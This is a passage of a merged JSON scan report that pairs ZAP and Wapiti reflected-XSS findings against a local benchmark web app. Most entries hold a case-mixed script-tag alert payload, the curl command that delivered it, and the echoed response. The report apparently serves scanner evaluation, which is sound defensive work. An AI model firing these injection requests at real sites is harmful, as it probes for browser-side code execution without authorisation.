            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:11 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wvhjibncb4')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00473",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00473?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00473=%3CScRiPt%3Ealert%28%27wwtq1gujgn%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wwtq1gujgn')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wwtq1gujgn')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00473\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00473.html?BenchmarkTest00473=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00473=%3CScRiPt%3Ealert%28%27wwtq1gujgn%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00473"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00473', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00473.html?BenchmarkTest00473=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDA0NzM9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00473', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00473.html?BenchmarkTest00473=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00473=%3CScRiPt%3Ealert%28%27wwtq1gujgn%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wwtq1gujgn')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00475",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00475?BenchmarkTest00475=SafeText&BenchmarkTest00475=Movies&BenchmarkTest00475=Writing&BenchmarkTest00475=%3CScRiPt%3Ealert%28%27wtjpm96oj5%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wtjpm96oj5')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wtjpm96oj5')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00475\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00475.html\" -d \"BenchmarkTest00475=SafeText&BenchmarkTest00475=Movies&BenchmarkTest00475=Writing&BenchmarkTest00475=%3CScRiPt%3Ealert%28%27wtjpm96oj5%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00475"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00475', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00475.html?BenchmarkTest00475=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwNDc1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00475', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00475.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00475=SafeText&BenchmarkTest00475=Movies&BenchmarkTest00475=Writing&BenchmarkTest00475=%3CScRiPt%3Ealert%28%27wtjpm96oj5%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:23:25 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wtjpm96oj5')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00478",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00478?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00478=%3CScRiPt%3Ealert%28%27w0m4lhmkua%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w0m4lhmkua')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w0m4lhmkua')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00478\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00478.html?BenchmarkTest00478=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00478=%3CScRiPt%3Ealert%28%27w0m4lhmkua%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00478"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00478', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00478.html?BenchmarkTest00478=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDA0Nzg9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00478', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00478.html?BenchmarkTest00478=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00478=%3CScRiPt%3Ealert%28%27w0m4lhmkua%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:26 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w0m4lhmkua')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00642",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00642?BenchmarkTest00642=SafeText&BenchmarkTest00642=Movies&BenchmarkTest00642=Writing&BenchmarkTest00642=%3CScRiPt%3Ealert%28%27wc6tj1m8l9%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wc6tj1m8l9')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wc6tj1m8l9')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00642\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00642.html?BenchmarkTest00642=SafeText\" -d \"BenchmarkTest00642=SafeText&BenchmarkTest00642=Movies&BenchmarkTest00642=Writing&BenchmarkTest00642=%3CScRiPt%3Ealert%28%27wc6tj1m8l9%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00642"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00642', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00642.html?BenchmarkTest00642=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwNjQyPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00642', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00642.html?BenchmarkTest00642=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00642=SafeText&BenchmarkTest00642=Movies&BenchmarkTest00642=Writing&BenchmarkTest00642=%3CScRiPt%3Ealert%28%27wc6tj1m8l9%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:53 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:39 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wc6tj1m8l9')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00643",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00643?BenchmarkTest00643=%3CScRiPt%3Ealert%28%27wz5388erhs%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wz5388erhs')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wz5388erhs')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00643\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00643.html\" -d \"BenchmarkTest00643=%3CScRiPt%3Ealert%28%27wz5388erhs%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent 